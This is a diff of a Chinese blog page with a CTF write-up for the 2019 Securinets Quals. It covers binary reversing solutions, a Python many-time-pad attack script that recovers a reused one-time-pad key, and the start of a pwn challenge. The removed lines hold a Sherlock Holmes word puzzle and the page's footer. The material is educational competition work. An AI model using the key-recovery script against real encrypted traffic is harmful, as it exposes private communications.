-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">--START--</span><br><span class="line">&quot;The fact is that upon his entrance I had instantly recognized the extreme</span><br><span class="line">personal danger in which I lay. The only conceivable escape for him lay in silencing</span><br><span class="line">my tongue. In an instant I had slipped the revolver from the drawer into my</span><br><span class="line">pocket and was covering him through the cloth. At his remark I drew the weapon</span><br><span class="line">out and laid it cocked upon the table. He still smiled and blinked, but there was</span><br><span class="line">something about his eyes which made me feel very glad that I had it there,</span><br><span class="line">&quot;You evidently don&apos;t know me,&apos; said he.</span><br><span class="line">&quot;&apos;On the contrary,&apos; I answered, &apos;I think it is fairly evident that I do. Pray take</span><br><span class="line">a chair. I can spare you five minutes if you have anything to say.&apos;</span><br><span class="line">&quot;&apos;All that I have to say has already crossed your mind,&apos; said he.</span><br><span class="line">&quot;&apos;Then possibly my answer has crossed yours,&apos; I replied.</span><br><span class="line">&quot;&apos;You stand fast?&apos;</span><br><span class="line">&quot;&apos;Absolutely.&apos;</span><br><span class="line">&quot;He clapped his hand into his pocket, and I raised the pistol from the table.</span><br><span class="line">But he merely drew out a &lt;DETELED_WORD&gt; in which he had scribbled some</span><br><span class="line">dates.</span><br><span class="line">&quot;You crossed my path on the fourth of January,&apos; said he. &apos;On the twenty-third</span><br><span class="line">you incommoded me; by the middle of February I was seriously inconvenienced</span><br><span class="line">by you; at the end of March I was absolutely hampered in my plans; and now, at</span><br><span class="line">the close of April, I find myself placed in such a position through your continual</span><br><span class="line">persecution that I am in positive danger of losing my liberty. The situation is</span><br><span class="line">becoming an impossible one.&apos;</span><br><span class="line">&quot;&apos;Have you any suggestion to make?&apos; I asked.</span><br><span class="line">&quot;&apos;You must drop it, Mr. Holmes,&apos; said he, swaying his face about. &apos;You really</span><br><span class="line">must, you know.&apos;&quot;</span><br><span class="line">--END--;</span><br></pre></td></tr></table></figure>
-<p>可以看到有一个单词被删掉了，根据题目提示我们需要找到这个单词。google 之后发现是<a href="https://www.pagebypagebooks.com/Arthur_Conan_Doyle/Memoirs_of_Sherlock_Holmes/Adventure_XI_The_Final_Problem_p4.html" target="_blank" rel="noopener">福尔摩斯的一个片段</a>，找到单词之后，<a href="http://www.sha1-online.com/" target="_blank" rel="noopener">在线 sha1</a>哈希一下得到 flag。</p>
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/" target="_blank" rel="noopener">http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/</a><br><a href="https://www.youtube.com/watch?v=r23Yk2lutJ0&amp;feature=youtu.be" target="_blank" rel="noopener">https://www.youtube.com/watch?v=r23Yk2lutJ0&amp;feature=youtu.be</a><br><a href="https://ptr-yudai.hatenablog.com/entry/2019/03/25/152043" target="_blank" rel="noopener">https://ptr-yudai.hatenablog.com/entry/2019/03/25/152043</a><br><a href="https://www.rootnetsec.com/securinets-prequals-automateme/" target="_blank" rel="noopener">https://www.rootnetsec.com/securinets-prequals-automateme/</a><br><a href="https://ctftime.org/writeup/14075" target="_blank" rel="noopener">https://ctftime.org/writeup/14075</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>
-
-      
-        
-	<div id="comment">
-		<!-- 来必力City版安装代码 -->
-		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
-		<script type="text/javascript">
-		   (function(d, s) {
-		       var j, e = d.getElementsByTagName(s)[0];
-
-		       if (typeof LivereTower === 'function') { return; }
-
-		       j = d.createElement(s);
-		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-		       j.async = true;
-
-		       e.parentNode.insertBefore(j, e);
-		   })(document, 'script');
-		</script>
-		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
-		</div>
-		<!-- City版安装代码已完成 -->
-	</div>
-
-
-
-      
-    </footer>
-    <hr class="entry-footer-hr">
   </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2019/03/31/2019-b00t2root-CTF/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          2019-b00t2root-CTF
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2019/03/17/Buffer-Overflow-with-gcc-4-9/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Buffer Overflow with gcc&gt;=4.9</div>
-    </a>
-  
 </nav>
 
-  
-</article>
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
 
-<!-- Table of Contents -->
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Monday, March 25th 2019, 8:45 am
+                </p>
+              
 
-  <aside id="sidebar">
-    <div id="toc" class="toc-article">
-    <strong class="toc-title">Contents</strong>
-    
-      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Reversing"><span class="nav-number">1.</span> <span class="nav-text">Reversing</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#AutomateMe"><span class="nav-number">1.1.</span> <span class="nav-text">AutomateMe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Warmup-Welcome-to-securinets-CTF"><span class="nav-number">1.2.</span> <span class="nav-text">Warmup: Welcome to securinets CTF!</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Useless-Admin"><span class="nav-number">3.</span> <span class="nav-text">Useless Admin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-number">4.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Welcome"><span class="nav-number">4.1.</span> <span class="nav-text">Welcome</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-one"><span class="nav-number">4.2.</span> <span class="nav-text">Baby one</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Simple"><span class="nav-number">4.3.</span> <span class="nav-text">Simple</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-Two"><span class="nav-number">4.4.</span> <span class="nav-text">Baby Two</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">5.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Feedback"><span class="nav-number">5.1.</span> <span class="nav-text">Feedback</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Foren"><span class="nav-number">6.</span> <span class="nav-text">Foren</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-Trade"><span class="nav-number">6.1.</span> <span class="nav-text">Easy Trade</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">7.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HIDDEN"><span class="nav-number">7.1.</span> <span class="nav-text">HIDDEN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EZ"><span class="nav-number">7.2.</span> <span class="nav-text">EZ</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">8.</span> <span class="nav-text">Reference</span></a></li></ol>
-    
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    4.7k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      27 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
     </div>
-  </aside>
+  </header>
 
-</section>
-        
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>比赛的时候做了四道题，顺便复现几道没做出来的题目。</p>
+<p><img src="/pics/2019-Securinets-CTF-Quals/1.png" srcset="/img/loading.gif" alt></p>
+<a id="more"></a>
+<h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="AutomateMe"><a href="#AutomateMe" class="headerlink" title="AutomateMe"></a>AutomateMe</h2><pre><code class="bash">root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe# file ./bin
+./bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=cbafec6cc96cbdd6feea8085adeeafb3fc05c11f, not stripped
+</code></pre>
+<p>用 radare2 分析一下：</p>
+<pre><code>root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe# radare2 ./bin
+ -- Execute commands on a temporary offset by appending &#39;@ offset&#39; to your command.
+[0x000005d0]&gt; aaa
+[Invalid instruction of 16368 bytes at 0x124 entry0 (aa)
+Invalid instruction of 16366 bytes at 0x124
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+...
+[x] Type matching analysis for all functions (aaft)
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[0x000005d0]&gt; s main
+[0x000006da]&gt; pdf
+Linear size differs too much from the bbsum, please use pdr instead.
+[0x000006da]&gt; pdr
+Do you want to print 1316 lines? (y/N) y
+...
+| 0x00000786      3c68           cmp al, 0x68                          ; &#39;h&#39;
+| ; DATA XREF from main (+0x173d3)
+| 0x00000788      7416           je 0x7a0
+| ----------- true: 0x000007a0  false: 0x0000078a
+| ; DATA XREF from main (+0x1742f)
+| 0x0000078a      488d3de57c02.  lea rdi, str.nope_:                   ; 0x28476 ; &quot;nope :( &quot; ; const char *format
+| ; DATA XREF from main (+0x1758d)
+| 0x00000791      b800000000     mov eax, 0
+| ; DATA XREF from main (+0x17681)
+| 0x00000796      e815feffff     call sym.imp.printf                   ; int printf(const char *format)
+| ; DATA XREF from main (+0x1776e)
+| 0x0000079b      e9007c0200     jmp 0x283a0
+...
+</code></pre><p>在 <code>0x00000786</code> 处可以看到将输入的某个字符与 <code>h</code> 进行了比较。</p>
+<pre><code>...
+| ----------- true: 0x000283a0
+| ; CODE XREF from main (0x788)
+| ; DATA XREF from main (+0x17869)
+| 0x000007a0      488b45e0       mov rax, qword [s]
+| ; DATA XREF from main (+0x17928)
+| 0x000007a4      4883c008       add rax, 8
+| ; DATA XREF from main (+0x179e7)
+| 0x000007a8      488b00         mov rax, qword [rax]
+| ; DATA XREF from main (+0x17a86)
+| 0x000007ab      0fb64002       movzx eax, byte [rax + 2]             ; [0x2:1]=76
+| ; DATA XREF from main (+0x17b4c)
+| 0x000007af      8845ff         mov byte [local_1h], al
+| ; DATA XREF from main (+0x17bdd)
+| 0x000007b2      8075ffeb       xor byte [local_1h], 0xeb
+| ; DATA XREF from main (+0x17ca3)
+| 0x000007b6      807dff8e       cmp byte [local_1h], 0x8e
+| ; DATA XREF from main (+0x17d70)
+| 0x000007ba      7416           je 0x7d2
+...
+</code></pre><p>往下看变得复杂了一些，将输入和 <code>0xeb</code> 异或了一下再与 <code>0x8e</code> 比较，故这里的字符是 <code>chr(0xeb^0x8e)=&#39;e&#39;</code>。</p>
+<p>事实证明，这道题用 Ghidra 很方便。这个文件的 main 函数非常大，ida 都没法反编译。Ghidra 可以快速地分析，然后我们通过 python 正则匹配一下就能得到 flag：</p>
+<p><img src="/pics/2019-Securinets-CTF-Quals/2.png" srcset="/img/loading.gif" alt></p>
+<p>正则匹配：</p>
+<pre><code class="python">#!/usr/bin/env python
+import re
+with open(&#39;bin.c&#39;, &#39;rb&#39;) as f:
+    txt = f.read()
+    regex = re.compile(r&#39;\&#39;(.*)\&#39;&#39;)
+    # print regex.findall(txt)
+    output = &#39;&#39;
+    for c in regex.findall(txt):
+        output += c
+    print output
+</code></pre>
+<p>输出 flag：</p>
+<pre><code class="bash">$ ./solve.py | grep -E &quot;flag|securinets&quot;
+... here is you flag securinets{automating_everything_is_the_new_future} ...
+</code></pre>
+<h2 id="Warmup-Welcome-to-securinets-CTF"><a href="#Warmup-Welcome-to-securinets-CTF" class="headerlink" title="Warmup: Welcome to securinets CTF!"></a>Warmup: Welcome to securinets CTF!</h2><pre><code>root@91120f278fdd:~/ctf/2019-Securinets/re/warmup# file warmup
+warmup: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=93a17fbbf5e51001a87144a35c32ea813c43cbf4, stripped
+</code></pre><p>ltrace 一下，大概能看出做了什么：</p>
+<pre><code class="bash">root@91120f278fdd:~/ctf/2019-Securinets# ltrace ./warmup
+puts(&quot;Welcome to securinets quals CTF &quot;...Welcome to securinets quals CTF :)
+)                                                 = 35
+printf(&quot;PASSCODE:&quot;)                                                                         = 9
+fgets(PASSCODE:ABC123
+&quot;ABC123\n&quot;, 100, 0x7f6912b8aa00)                                                      = 0x55e762c220e0
+strlen(&quot;ABC123\n&quot;)                                                                          = 7
+...
+malloc(137)                                                                                 = 0x55e763504a80
+strlen(&quot;QUJDMTIzCgCA/gMAcP4AADhpAAABABBp&quot;...)                                               = 136
+...
+strlen(&quot;QUJDMTIz&quot;)                                                                          = 8
+strlen(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef&quot;...)                                               = 62
+...
+puts(&quot;NOPE :( &quot;NOPE :(
+)                                                                            = 9
+exit(0 &lt;no return ...&gt;
++++ exited (status 0) +++
+</code></pre>
+<p>放进 ida 里看看 main 函数：</p>
+<pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  int length; // eax
+  _BOOL4 v4; // ebx
+  int v5; // ebx
+  int v6; // ebx
+  int v7; // ebx
+  int v8; // ebx
+  int v9; // ebx
+  int v10; // ebx
+  int v11; // ebx
+  int v12; // ebx
+  int v13; // ebx
+  int v14; // ebx
+  int v15; // ebx
+  int v16; // ebx
+  int v17; // ebx
+  int v18; // ebx
+  int v19; // ebx
+  int v20; // ebx
+  int v21; // ebx
+  int v22; // ebx
+  int v23; // ebx
+  int v24; // ebx
+  int v25; // ebx
+  int v26; // ebx
+  int v27; // ebx
+  int i; // [rsp+8h] [rbp-1C8h]
+  int j; // [rsp+Ch] [rbp-1C4h]
+  char *s; // [rsp+18h] [rbp-1B8h]
+  int v32[102]; // [rsp+20h] [rbp-1B0h]
+  unsigned __int64 v33; // [rsp+1B8h] [rbp-18h]
+
+  v33 = __readfsqword(0x28u);
+  puts(&quot;Welcome to securinets quals CTF :)&quot;);
+  printf(&quot;PASSCODE:&quot;, a2);
+  fgets(passcode, 100, stdin);
+  for ( i = 0; i &lt; strlen(passcode); ++i )
+    v32[i] = passcode[i];
+  length = sub_89A(0x64u);
+  s = (char *)malloc(length + 1);
+  base64_encode((__int64)v32, 0x64u, (__int64)s);
+  for ( j = 0; j &lt; strlen(s) &amp;&amp; s[j] != &#39;C&#39;; ++j )
+    base64_string[j] = s[j];
+  base64_string[strlen(base64_string)] = 0;
+  v4 = sub_B88(base64_string);
+  v5 = (unsigned __int64)sub_C07(base64_string) + v4;
+  v6 = (unsigned __int64)sub_C68((__int64)base64_string) + v5;
+  v7 = (unsigned __int64)sub_E25(base64_string) + v6;
+  v8 = (unsigned __int64)sub_C90(base64_string) + v7;
+  v9 = (unsigned __int64)sub_CAD(base64_string) + v8;
+  v10 = (unsigned __int64)sub_CDA(base64_string) + v9;
+  v11 = (unsigned __int64)sub_DA8(base64_string) + v10;
+  v12 = (unsigned __int64)sub_DF4(base64_string) + v11;
+  v13 = (unsigned __int64)sub_E6E(base64_string) + v12;
+  v14 = (unsigned __int64)sub_ECA(base64_string) + v13;
+  v15 = (unsigned __int64)sub_EF7(base64_string) + v14;
+  v16 = (unsigned __int64)sub_F53(base64_string) + v15;
+  v17 = (unsigned __int64)sub_FAF(base64_string) + v16;
+  v18 = (unsigned __int64)sub_E51(s) + v17;
+  v19 = (unsigned __int64)sub_107E(base64_string) + v18;
+  v20 = (unsigned __int64)sub_10AF(base64_string) + v19;
+  v21 = (unsigned __int64)sub_10E0(base64_string) + v20;
+  v22 = (unsigned __int64)sub_10FD(base64_string) + v21;
+  v23 = (unsigned __int64)sub_112A(base64_string) + v22;
+  v24 = (unsigned __int64)sub_11FB(base64_string) + v23;
+  v25 = (unsigned __int64)sub_1234(base64_string) + v24;
+  v26 = (unsigned __int64)sub_1287(base64_string) + v25;
+  v27 = (unsigned __int64)sub_12B6(base64_string) + v26;
+  if ( v27 + (unsigned int)sub_1309(base64_string) == 25 )
+  {
+    puts(&quot;Good job! u know what to do and submit!&quot;);
+  }
+  else
+  {
+    puts(&quot;NOPE :(&quot;);
+    free(s);
+  }
+  return 0LL;
+}
+</code></pre>
+<p>一开始做了一个 base64，然后一系列的没有规律的加密，我们所需要做的是耐心地倒退出来就行了。脚本：</p>
+<pre><code class="python">#!/usr/bin/env python
+import base64
+
+def pos(x,y):
+    for i in range(len(y)):
+        if y[i] == x:
+            return i
+
+table = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;
+enc = [0] * 36
+enc[0] = ord(table[28])
+enc[3] = ord(&#39;j&#39;)
+enc[4] = enc[0] + 1
+enc[12] = enc[4] - 1
+enc[22] = enc[4] - 1
+enc[24] = enc[4] - 1
+enc[1] = ord(table[54])
+enc[2] = ord(table[((28 + pos(chr(enc[1]), table)) &gt;&gt; 2) + 1])
+enc[10] = enc[2]
+enc[6] = enc[3] - 32
+enc[7] = ord(&#39;p&#39;)
+enc[11] = 48
+enc[23] = 48
+enc[35] = enc[11] + 9
+enc[8] = enc[0] - 1
+enc[27] = enc[4] + 2
+enc[31] = enc[27]
+enc[9] = enc[27] + 7
+enc[25] = enc[27] + 7
+enc[13] = enc[1] + 1
+enc[17] = enc[1] + 1
+enc[21] = enc[1] + 1
+enc[15] = enc[7] + 3
+enc[14] = enc[15] + 1
+enc[19] = ord(&#39;z&#39;)
+enc[34] = enc[0] - 33
+enc[5] = 88
+enc[20] = 88
+enc[29] = 88
+enc[33] = 88
+enc[26] = 49
+enc[16] = enc[9] - 32
+enc[28] = enc[16]
+enc[18] = enc[7] - 30
+enc[30] = enc[18]
+enc[32] = enc[4]
+
+flag = &#39;&#39;
+for i in enc:
+    flag += chr(i)
+flag = base64.b64decode(flag)
+print &#39;flag:&#39;, flag
+</code></pre>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h1 id="Useless-Admin"><a href="#Useless-Admin" class="headerlink" title="Useless Admin"></a>Useless Admin</h1><p>题目说明了是 OTP（一次一密），并且给了一个 json，里面有用同一个密钥加密的不同密文，以及同样被加密的 flag。</p>
+<pre><code class="json">{
+  &quot;cipher_list&quot;: [&quot;1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940&quot;, &quot;1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f&quot;, &quot;1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d&quot;, &quot;160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f&quot;, &quot;1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c&quot;, &quot;1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e&quot;, &quot;1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347&quot;, &quot;0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42&quot;, &quot;160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542&quot;, &quot;1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b&quot;, &quot;1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40&quot;],
+  &quot;cipher_flag&quot;: &quot;1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b&quot;
+}
+</code></pre>
+<p>同时我找到了一篇 <a href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/" target="_blank" rel="noopener">2017 年 AlexCTF 中类似的 writeup</a>，用的是 github 上的一个 <a href="https://raw.githubusercontent.com/Jwomers/many-time-pad-attack/master/attack.py" target="_blank" rel="noopener">attack 脚本</a>。</p>
+<pre><code class="python">#!/usr/bin/env python
+## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017
+# @author intrd - http://dann.com.br/
+# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)
+
+import string
+import collections
+import sets, sys
+
+# 11 unknown ciphertexts (in hex format), all encrpyted with the same key
+c1 = &#39;1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940&#39;
+c2 = &#39;1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f&#39;
+c3 = &#39;1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d&#39;
+c4 = &#39;160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f&#39;
+c5 = &#39;1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c&#39;
+c6 = &#39;1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e&#39;
+c7 = &#39;1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347&#39;
+c8 = &#39;0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42&#39;
+c9 = &#39;160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542&#39;
+c10 = &#39;1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b&#39;
+c11 = &#39;1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40&#39;
+ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]
+# The target ciphertext we want to crack
+target_cipher = &#39;1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b&#39;
+
+# XORs two string
+def strxor(a, b):     # xor two strings (trims the longer input)
+    return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])
+
+# To store the final key
+final_key = [None]*300
+# To store the positions we know are broken
+known_key_positions = set()
+
+# For each ciphertext
+for current_index, ciphertext in enumerate(ciphers):
+    counter = collections.Counter()
+    # for each other ciphertext
+    for index, ciphertext2 in enumerate(ciphers):
+        if current_index != index: # don&#39;t xor a ciphertext with itself
+            for indexOfChar, char in enumerate(strxor(ciphertext.decode(&#39;hex&#39;), ciphertext2.decode(&#39;hex&#39;))): # Xor the two ciphertexts
+                # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#39;t know which one)
+                if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index
+    knownSpaceIndexes = []
+
+    # Loop through all positions where a space character was possible in the current_index cipher
+    for ind, val in counter.items():
+        # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!
+        if val &gt;= 7: knownSpaceIndexes.append(ind)
+    #print knownSpaceIndexes # Shows all the positions where we now know the key!
+
+    # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!
+    xor_with_spaces = strxor(ciphertext.decode(&#39;hex&#39;),&#39; &#39;*300)
+    for index in knownSpaceIndexes:
+        # Store the key&#39;s value at the correct position
+        final_key[index] = xor_with_spaces[index].encode(&#39;hex&#39;)
+        # Record that we known the key at this position
+        known_key_positions.add(index)
+
+# Construct a hex key from the currently known key, adding in &#39;00&#39; hex chars where we do not know (to make a complete hex string)
+final_key_hex = &#39;&#39;.join([val if val is not None else &#39;00&#39; for val in final_key])
+# Xor the currently known key with the target cipher
+output = strxor(target_cipher.decode(&#39;hex&#39;),final_key_hex.decode(&#39;hex&#39;))
+
+print &quot;Fix this sentence:&quot;
+print &#39;&#39;.join([char if index in known_key_positions else &#39;*&#39; for index, char in enumerate(output)])+&quot;\n&quot;
+
+# WAIT.. MANUAL STEP HERE
+# This output are printing a * if that character is not known yet
+# fix the missing characters like this: &quot;Let*M**k*ow if *o{*a&quot; = &quot;cure, Let Me know if you a&quot;
+# if is too hard, change the target_cipher to another one and try again
+# and we have our key to fix the entire text!
+
+#sys.exit(0) #comment and continue if u got a good key
+
+#target_plaintext = &quot;cure, Let Me know if you a&quot;
+target_plaintext = &quot;i wanted to end the world, but i&#39;ll settle for ending yours.&quot;
+print &quot;Fixed:&quot;
+print target_plaintext+&quot;\n&quot;
+
+key = strxor(target_cipher.decode(&#39;hex&#39;),target_plaintext)
+
+print &quot;Decrypted msg:&quot;
+for cipher in ciphers:
+    print strxor(cipher.decode(&#39;hex&#39;),key)
+
+print &quot;\nPrivate key recovered: &quot;+key+&quot;\n&quot;
+</code></pre>
+<p>具体原理应该就是异或了，只需要想办法复原 key 即可。我还找到一个 <a href="https://github.com/CameronLonsdale/MTP" target="_blank" rel="noopener">cli 工具</a>，让还原 key 更简单，截图如下：</p>
+<p><img src="/pics/2019-Securinets-CTF-Quals/3.png" srcset="/img/loading.gif" alt></p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>给了个 ssh，然后无法执行 welcome 以及查看 flag.txt：</p>
+<pre><code class="shell">$ pwd
+/home/welcome
+$ whoami
+welcome
+$ ls -al
+total 56
+dr-xr-xr-x   2 welcome         welcome          4096 Mar 23 20:23 .
+drwxr-xr-x  22 root            root             4096 Mar 24 10:18 ..
